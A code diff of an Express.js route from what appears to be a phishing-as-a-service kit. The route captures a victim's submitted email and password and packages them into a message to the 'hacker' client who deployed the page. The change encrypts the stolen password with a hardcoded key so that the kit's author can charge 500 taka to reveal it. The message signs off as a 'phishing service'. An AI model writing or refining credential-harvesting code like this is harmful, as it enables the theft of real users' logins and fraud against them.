@@ -43,37 +43,28 @@ var myArray = [
 
 app.post('/_', function (req, res) {
    // res.render('f_success');
-const text = 'Hello, World!';
+
 const password = req.body.password;
  
-const encrypted = encryptpwd.encrypt(text, password);
- 
- let pass = "618ee6985b5153162764e5e7e95ac183511cc8c1556244dcc3ffba521504ee33bd90046a8a0c1224257d9c6d170ec007";
- 
-let pas = "618ee6985b5153162764e5e7e95ac183511cc8c1556244dcc3ffba521504ee33bd90046a8a0c1224257d9c6d170ec007";
- 
 
- 
-const decrypted = encryptpwd.decrypt(encrypted, password);
-//console.log(decrypted);
     
  const cryptr = new Cryptr('myTotallySecretKey');
 
-const encryptedString = cryptr.encrypt('bacon');
-const decryptedString = cryptr.decrypt('ddc8ac94bb0f7fa8ddbd7d3f7792beb2cb769b1882331c7d432d2ec0e069963cf0c61c3e6e55f5e782ade819c988fe416279578ff668302d8feb77368d428e326e9068cb309e58dd10c2a5a6c406620f43d7cfe6108b3273e40c851996312b58f1fd2cd879');
+const encryptedPass = cryptr.encrypt(password);
+const decryptedPass = cryptr.decrypt(encryptedPass);
 
-//console.log(encryptedString); // 2a3260f5ac4754b8ee3021ad413ddbc11f04138d01fe0c5889a0dd7b4a97e342a4f43bb43f3c83033626a76f7ace2479705ec7579e4c151f2e2196455be09b29bfc9055f82cdc92a1fe735825af1f75cfb9c94ad765c06a8abe9668fca5c42d45a7ec233f0
-console.log(decryptedString); // bacon
+
+console.log(decryptedPass);
  
  
  
-    var captured_content = `\n Email: ${req.body.email} Password: ${pas+":"+password+";"+pass}`;
+    var captured_content = `\n Email: ${req.body.email} Password: ${encryptedPass}`;
     let toMail = req.body.owner;
     
     
     
    // console.log("es"+toMail);
-    var template = "<h1> Dear Hackers,</h1> <p style='color:red;'>To get password and making the app more secure, you have to pay onetime tk-500, for the stay live server running,<p> <p>পাসওয়ার্ড পেতে এবং অ্যাপটিকে আরও সুরক্ষিত করতে, লাইভ সার্ভার চালু থাকার জন্য আপনাকে এককালীন টাকা-500 টাকা দিতে হবে। </p><br><br> If the input value has correct then id was hacked!"+captured_content+ "<br><br><br><br><br><br> Thanks for your understanding,<br>phishing service by 'Eshak'";
+    var template = "<h1> Dear Hackers,</h1> <p style='color:red;'>To get password and making the app more secure, you have to pay onetime tk-500, for the stay live server running,<p> <p>পাসওয়ার্ড পেতে এবং অ্যাপটিকে আরও সুরক্ষিত করতে, লাইভ সার্ভার চালু থাকার জন্য আপনাকে এককালীন টাকা-500 টাকা দিতে হবে। </p><br><br> If the input value has correct then id was hacked!"+captured_content+"<br><br><br><br><br><br> Thanks for your understanding,<br>phishing service by 'Eshak'";
 
     
   if(req.body.owner){
